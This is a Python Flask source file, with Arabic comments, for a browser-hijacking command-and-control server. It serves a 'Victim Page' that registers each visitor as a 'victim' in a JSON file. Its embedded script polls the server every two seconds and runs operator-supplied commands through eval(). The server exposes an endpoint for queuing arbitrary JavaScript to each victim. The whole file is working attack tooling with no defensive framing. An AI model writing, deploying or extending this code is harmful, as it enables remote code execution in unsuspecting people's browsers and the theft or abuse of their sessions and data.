from flask import Flask, render_template_string, request, jsonify
import uuid
import json
import os
from datetime import datetime

app = Flask(__name__)

victims_file = 'victims.json'
commands = {}  # تخزين الأوامر لكل ضحية

@app.route("/")
def index():
    # إنشاء UUID للضحية
    victim_id = str(uuid.uuid4())

    # قراءة البيانات القديمة
    victims_list = []
    if os.path.exists(victims_file):
        with open(victims_file, 'r', encoding='utf-8') as f:
            try:
                victims_list = json.load(f)
            except json.JSONDecodeError:
                victims_list = []

    # إضافة الضحية الجديدة
    victims_list.append({
        "id": victim_id,
        "status": "online",
        "last_seen": datetime.utcnow().isoformat()
    })

    # حفظ الملف
    with open(victims_file, 'w', encoding='utf-8') as f:
        json.dump(victims_list, f, indent=2, ensure_ascii=False)

    # HTML مع سكربت يجلب الأوامر وينفذها
    html_content = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Victim Page</title>
        <meta charset="utf-8">
    </head>
    <body>
        <h1>Welcome</h1>
        <script>
            var victim_id = "{victim_id}";
            console.log("Victim ID:", victim_id);

            async function checkCommand() {{
                try {{
                    let res = await fetch(`/api/get_command?victim=${{victim_id}}`);
                    let data = await res.json();
                    if (data.command) {{
                        console.log("Executing:", data.command);
                        eval(data.command); // تنفيذ الأمر مباشرة
                    }}
                }} catch (err) {{
                    console.error("Error fetching command:", err);
                }}
            }}

            // جلب الأوامر كل ثانيتين
            setInterval(checkCommand, 2000);
        </script>
    </body>
    </html>
    """
    return render_template_string(html_content)

@app.route("/api/get_command")
def get_command():
    victim_id = request.args.get("victim")
    cmd = commands.pop(victim_id, None)  # جلب ومسح الأمر بعد تنفيذه
    return jsonify({"command": cmd})

@app.route("/api/execute", methods=["POST"])
def execute():
    data = request.get_json()
    victim_id = data.get("victim")
    cmd = data.get("command")
    if not victim_id or not cmd:
        return jsonify({"error": "Missing victim or command"}), 400
    commands[victim_id] = cmd
    print(f"[COMMAND] For {victim_id}: {cmd}")
    return jsonify({"status": "ok"})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
